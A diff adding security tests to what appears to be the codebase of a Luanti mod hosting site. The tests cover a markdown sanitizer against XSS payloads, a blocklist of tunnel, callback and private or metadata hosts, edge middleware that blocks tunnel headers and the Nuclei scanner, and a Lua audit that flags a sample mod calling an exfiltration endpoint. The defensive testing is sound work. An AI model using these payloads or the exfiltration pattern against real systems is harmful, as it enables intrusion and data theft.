@@ -28,7 +28,11 @@ import { ImgFallbackDirective } from './shared/directives/img-fallback.directive
 import { runLuacheckStaticAudit, onRequestPost as gitOnRequestPost } from '../../functions/api/packages/git';
 import { onRequestGet as packageStatsOnRequestGet } from '../../functions/api/packages/[author]/[name]/stats';
 import { onRequestGet as authorStatsOnRequestGet } from '../../functions/api/authors/[username]/stats';
-import { onRequest as edgeMiddleware, checkEdgeRateLimit } from '../../functions/_middleware';
+import {
+  onRequest as edgeMiddleware,
+  checkEdgeRateLimit,
+  detectInboundEphemeralTunnelHeader
+} from '../../functions/_middleware';
 import {
   autoResolveBrokenRepoReport,
   solveAnubisPowChallengeSync,
@@ -49,7 +53,12 @@ import {
   computeLuantiHubFrecencyMetrics,
   resolveLocalizedPackageText,
   parseScreenshotMetaArray,
-  findReverseDependenciesForPackage
+  findReverseDependenciesForPackage,
+  isUntrustedTunnelOrPrivateHost,
+  detectGitProviderFromUrl,
+  sanitizePackageImageUrl,
+  normalizeGitRepoInputUrl,
+  isDefunctGitHost
 } from '../../functions/api/lib/upstream';
 import { onRequestGet as minetestVersionsOnRequestGet } from '../../functions/api/minetest_versions';
 import { onRequestGet as contentWarningsOnRequestGet } from '../../functions/api/content_warnings';
@@ -13302,6 +13311,115 @@ core.register_node(modname .. ":panel", {
     const modalFixture = TestBed.createComponent(PackageDetailModalComponent);
     expect(modalFixture.componentInstance.getAuthorProfileUrl('sakel-hub')).toBe('/author/SaKeL');
     expect(modalFixture.componentInstance.getAuthorProfileUrl('SaKeL')).toBe('/author/SaKeL');
+
+    // Verify parseSafeMarkdown strips whitespace-less event handlers, <svg onload>, and entity-encoded javascript: URIs
+    const safeRendered = String(
+      (modalFixture.componentInstance as any).parseSafeMarkdown(
+        'Hello **world** [Docs](https://luantihub.org/docs) <img src=x/onerror=alert(1)> <svg onload=alert(1)></svg> <a href="&#106;avascript:alert(1)">bad</a>'
+      )
+    );
+    expect(safeRendered).toContain('<strong>world</strong>');
+    expect(safeRendered).toContain('href="https://luantihub.org/docs" target="_blank" rel="noopener noreferrer"');
+    expect(safeRendered).not.toContain('onerror');
+    expect(safeRendered).not.toContain('<svg');
+    expect(safeRendered).not.toContain('javascript:');
+
     modalFixture.destroy();
+  });
+
+  it('should detect and block Cloudflare Quick Tunnels (*.trycloudflare.com), disposable reverse tunnels, SSRF private IPs, and Lua C2 callbacks across all layers', async () => {
+    // 1. Layer 1: Shared tunnel & private IP blocklist (isUntrustedTunnelOrPrivateHost)
+    expect(isUntrustedTunnelOrPrivateHost('https://random-words-here.trycloudflare.com/attacker/mod')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('sub.cfargotunnel.com')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('https://abc123.ngrok-free.app/owner/repo')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('https://evil.ngrok.io/owner/repo')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('https://tunnel.loca.lt/owner/repo')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('https://test.serveo.net/owner/repo')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('https://catcher.webhook.site/track')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('https://ssrf.oastify.com/ping')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('https://c2.interact.sh/callback')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('http://127.0.0.1:8080/git/mod')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('http://169.254.169.254/latest/meta-data/')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('http://192.168.1.50/repo/mod')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('http://localhost:3000/repo/mod')).toBe(true);
+    expect(isUntrustedTunnelOrPrivateHost('http://[::1]:8080/repo/mod')).toBe(true);
+
+    // Legitimate public Git forges & self-hosted community instances remain allowed
+    expect(isUntrustedTunnelOrPrivateHost('https://github.com/luanti-org/luanti')).toBe(false);
+    expect(isUntrustedTunnelOrPrivateHost('https://codeberg.org/Wuzzy/MineClone2')).toBe(false);
+    expect(isUntrustedTunnelOrPrivateHost('https://git.minetest.land/MineClonia/MineClonia')).toBe(false);
+    expect(isUntrustedTunnelOrPrivateHost('https://gitlab.com/VanessaE/homedecor_modpack')).toBe(false);
+    expect(isUntrustedTunnelOrPrivateHost('https://git.bananach.space/advtrains.git')).toBe(false);
+
+    // 2. detectGitProviderFromUrl, normalizeGitRepoInputUrl, isDefunctGitHost, and sanitizePackageImageUrl
+    expect(detectGitProviderFromUrl('https://random-words.trycloudflare.com/attacker/mod')).toBeNull();
+    expect(detectGitProviderFromUrl('http://127.0.0.1:8080/attacker/mod')).toBeNull();
+    expect(normalizeGitRepoInputUrl('https://random-words.trycloudflare.com/attacker/mod')).toBeUndefined();
+    expect(isDefunctGitHost('https://random-words.trycloudflare.com/attacker/mod')).toBe(true);
+    expect(sanitizePackageImageUrl('https://evil.trycloudflare.com/pixel.png')).toBeUndefined();
+    expect(
+      sanitizePackageImageUrl('/api/packages?proxy_image=https%3A%2F%2Fevil.trycloudflare.com%2Fpixel.png')
+    ).toBeUndefined();
+    expect(sanitizePackageImageUrl('https://content.luanti.org/uploads/valid.png')).toBe(
+      'https://content.luanti.org/uploads/valid.png'
+    );
+    expect(normalizePromoUrl('https://evil.trycloudflare.com/promo.png')).toBeNull();
+    expect(normalizePromoUrl('http://127.0.0.1:8080/promo.png')).toBeNull();
+    expect(normalizePromoUrl('https://luantihub.org/promo.png')).toBe('https://luantihub.org/promo.png');
+
+    // 3. Layer 2: Inbound Edge Middleware tunnel detection, offensive scanner blocking & security headers
+    const tunnelReq = new Request('https://luantihub.org/api/packages', {
+      method: 'GET',
+      headers: {
+        'X-Forwarded-Host': 'phishing-proxy.trycloudflare.com',
+        'User-Agent': 'Mozilla/5.0'
+      }
+    });
+    expect(detectInboundEphemeralTunnelHeader(tunnelReq)).toEqual({
+      header: 'X-Forwarded-Host',
+      value: 'phishing-proxy.trycloudflare.com'
+    });
+    const blockedTunnelRes = await edgeMiddleware({
+      request: tunnelReq,
+      next: async () => new Response('OK', { status: 200 }),
+      env: {}
+    });
+    expect(blockedTunnelRes.status).toBe(403);
+    expect(blockedTunnelRes.headers.get('X-Content-Type-Options')).toBe('nosniff');
+    expect(blockedTunnelRes.headers.get('X-Frame-Options')).toBe('SAMEORIGIN');
+
+    const scannerReq = new Request('https://luantihub.org/api/packages', {
+      method: 'GET',
+      headers: {
+        'User-Agent': 'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)'
+      }
+    });
+    const blockedScannerRes = await edgeMiddleware({
+      request: scannerReq,
+      next: async () => new Response('OK', { status: 200 }),
+      env: {}
+    });
+    expect(blockedScannerRes.status).toBe(403);
+
+    // 4. Layer 3: Static Lua audit (E901 request_insecure_environment / loadlib + E902 tunnel C2 endpoints)
+    const maliciousLua = [
+      'local modname = core.get_current_modname()',
+      'local ie = core.request_insecure_environment()',
+      'local http = core.request_http_api()',
+      'http.fetch({ url = "https://exfil-data.trycloudflare.com/collect" }, function() end)'
+    ].join('\n');
+    const luaDiagnostics = runLuacheckStaticAudit(maliciousLua, 'evil_mod');
+    expect(
+      luaDiagnostics.some(
+        d => d.code === 'LUA_SANDBOX_VIOLATION (E901)' && d.title.includes('core.request_insecure_environment')
+      )
+    ).toBe(true);
+    expect(
+      luaDiagnostics.some(
+        d =>
+          d.code === 'LUA_SUSPICIOUS_TUNNEL_ENDPOINT (E902)' &&
+          d.title.includes('exfil-data.trycloudflare.com')
+      )
+    ).toBe(true);
   });
 });
